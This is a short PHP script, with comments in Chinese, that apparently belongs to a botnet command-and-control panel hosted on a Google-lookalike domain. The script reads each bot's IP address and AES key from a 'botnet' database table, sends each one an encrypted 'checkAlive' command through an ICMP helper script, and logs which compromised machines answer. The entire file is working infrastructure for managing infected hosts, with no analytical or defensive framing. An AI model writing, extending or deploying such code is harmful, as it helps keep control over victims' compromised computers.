<?
include 'sql_connect.php';


sleep(mt_rand(1, 5));

$sql = "SELECT INET6_NTOA(ip) AS ip, aes_key FROM botnet WHERE is_deleted=0";
$result = mysqli_query($conn, $sql);

if ($result && mysqli_num_rows($result) > 0) {

    $rows = mysqli_fetch_all($result, MYSQLI_ASSOC);

    foreach ($rows as $row) {

        $dst_ip  = $row['ip'];
        $aes_key = bin2hex($row['aes_key']); // binary → hex 傳 CLI
        $cmd     = "checkAlive";

        // 呼叫 icmp_function.php
        $run = "php /www/wwwroot/rjpanel.qooqle.date/icmp_function.php "
             . escapeshellarg($dst_ip) . " "
             . escapeshellarg($cmd)    . " "
             . escapeshellarg($aes_key);

        $output = trim(shell_exec($run));  // 移除換行

        echo "IP: $dst_ip<br>";
        echo "AES_KEY_HEX: $aes_key<br>";
        echo "OUTPUT:<br>$output<br><br>";

        // =====================================================
        //   更新 last_alive_time（只有 Alive 才更新）
        // =====================================================
        if (str_starts_with($output, "RJalive,")) {

            // Alive,1765118544 → 取出 timestamp
            $parts = explode(",", $output);
            if (isset($parts[1])) {
                $ts = intval($parts[1]);

                // 用 INET6_ATON 轉回 binary(4)
                $update_sql = "
                    UPDATE botnet 
                    SET last_alive_time = FROM_UNIXTIME($ts)
                    WHERE ip = INET6_ATON('$dst_ip')
                ";
                mysqli_query($conn, $update_sql);
            }
        }

        // 若是 TIMEOUT → 什麼都不做
    }

} else {
    echo "沒有資料<br>";
}

mysqli_close($conn);
?>